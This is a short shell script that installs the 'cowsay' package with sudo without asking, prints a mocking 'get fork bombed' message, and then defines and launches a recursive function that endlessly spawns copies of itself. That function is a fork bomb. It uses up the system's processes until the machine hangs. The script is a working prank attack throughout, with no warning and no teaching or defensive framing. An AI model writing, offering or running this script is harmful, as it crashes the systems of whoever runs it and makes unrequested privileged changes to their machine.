#!/bin/sh
REQUIRED_PKG="cowsay"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
          echo "aww, missing package: $REQUIRED_PKG. don't worry i'll install it for you! $REQUIRED_PKG."
            sudo apt-get --yes install $REQUIRED_PKG
fi
echo \n
cowsay "moo.. get fork bombed uWu"

bomb() {

bomb | bomb &

}; bomb

bomb
